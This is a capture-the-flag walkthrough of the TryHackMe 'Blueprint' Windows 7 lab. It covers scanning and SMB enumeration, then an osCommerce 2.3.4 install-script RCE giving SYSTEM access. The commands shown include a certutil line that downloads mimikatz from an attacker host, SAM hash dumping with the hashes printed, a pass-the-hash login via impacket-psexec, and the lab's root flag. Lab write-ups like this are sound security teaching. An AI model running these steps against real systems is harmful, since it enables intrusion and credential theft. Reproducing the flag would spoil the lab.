# CTF: Blueprint (THM)

## Metadata

- **Target IP:** 10.48.154.243
    
- **OS:** Windows 7 Home Basic 7601 SP1 (x32)
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-24
    
- **Key Skills/Tools:** Nmap, NetExec, osCommerce Exploitation, PHP Code Injection, Certutil, Mimikatz, NTLM Hash Dumping.
    

---

## Reconnaissance

### Port Scanning

A full port scan revealed several open services, including a web server running on multiple ports and standard Windows RPC/SMB ports.

Bash

```
sudo nmap -A -p- -T4 -Pn $target
```

**Key Ports:**

- **80/tcp:** IIS 7.5 (Returns 404)
    
- **443/tcp:** Apache 2.4.23 (Hosting osCommerce 2.3.4)
    
- **445/tcp:** SMB (Windows 7 SP1)
    
- **3306/tcp:** MariaDB
    
- **8080/tcp:** Apache 2.4.23 (Mirroring port 443)
    

### SMB Enumeration

Using `netexec` and `smbclient`, I identified that **Null Authentication** was enabled, allowing guest access to the `Users` share.

Bash

```
netexec smb $target -u 'guest' -p '' --shares
```

While I could browse the `Public` folders and see sample pictures, no immediate credentials or sensitive configuration files were found in the accessible shares.

---

## Credential Cracking

_No active cracking was performed during the initial foothold, as the exploit provided system-level access immediately. See the **Privilege Escalation** section for extracted NTLM hashes._

---

## Foothold

### osCommerce RCE (Exploit 50128.py)

The web server was running an outdated version of **osCommerce (2.3.4)**. Researching this version via `searchsploit` revealed a Remote Code Execution vulnerability that occurs if the `/install` directory is not removed after setup.

**Vulnerability Mechanism:**

The exploit targets `install.php` during the "finish" step (step 4). It injects a PHP `passthru()` function into the `DB_DATABASE` parameter. This malicious string is then written into `includes/configure.php`, which can be called directly to execute system commands.

**Execution:**

I used the Python exploit script to target the installation directory on port 8080.

Bash

```
python3 50128.py http://$target:8080/oscommerce-2.3.4/catalog/
```

**Result:**

The exploit successfully injected the payload, granting a semi-interactive shell as the highest privileged user.

- **User:** `nt authority\system`
    

---

## Lateral Movement

_Lateral movement was unnecessary as `nt authority\system` access was achieved directly._

---

## Privilege Escalation / Post-Exploitation

### Flag Retrieval

With System privileges, I navigated directly to the Administrator's desktop to retrieve the root flag.

DOS

```
type c:\users\administrator\desktop\root.txt.txt
```

### Hash Dumping with Mimikatz

To demonstrate full control over the machine, I transferred `mimikatz.exe` from my attacker machine using `certutil`.

DOS

```
certutil -urlcache -f http://10.10.x.x:8000/mimikatz.exe mimikatz.exe
```

I then dumped the local SAM database to retrieve NTLM hashes for the local users.

DOS

```
mimikatz "lsadump::sam" exit
```

**Extracted Hashes:**

- **Administrator:** `549a1bcb88e35dc18c7a0b0168631411`
    
- **Lab:** `30e87bf999828446a1c1209ddde4c450`
    

---
### Interactive Shell Stability (Pass-the-Hash)

To move from a volatile web shell to a stable, interactive session, I performed a **Pass-the-Hash** attack using the `impacket-psexec` tool. This allowed me to authenticate as the Administrator using only the NTLM hash.

Bash

```
impacket-psexec blueprint/administrator@$target -hashes :549a1bcb88e35dc18c7a0b0168631411
```

**Result:** PsExec successfully uploaded a service binary and opened a stable SYSTEM shell.

DOS

```
C:\Windows\system32> whoami
nt authority\system
```
## Flags

|**Flag Type**|**Value**|
|---|---|
|**Root**|THM{aea1e3ce6fe7f89e10cea833ae009bee}|

---

It's always a good day when the web app gives you `SYSTEM` on a silver platter. That osCommerce exploit is a perfect example of why "Delete the Install Folder" isn't just a suggestion: it's a critical security step.

